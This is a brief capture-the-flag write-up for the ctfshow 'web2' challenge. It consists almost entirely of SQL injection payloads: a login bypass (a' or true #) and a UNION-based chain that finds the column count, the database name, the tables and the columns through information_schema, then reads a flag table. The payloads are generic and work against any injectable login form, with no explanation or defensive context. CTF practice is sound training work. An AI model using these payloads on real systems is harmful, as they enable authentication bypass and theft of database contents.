ctfshow-WEB-web2

万能账号

``` basic
a' or true #
```



```` basic
a' union select 1,2,3 #


a' union select 1,database(),3 #


a' union select 1,
(select group_concat(table_name) from information_schema.tables where table_schema='web2'),
3	#
        
        
        
a' union select 1,
(select group_concat(column_name) from information_schema.columns where table_schema='web2' and table_name='flag'),
3	#
                
                
a' union select 1,
(select flag from flag),
3	#
````

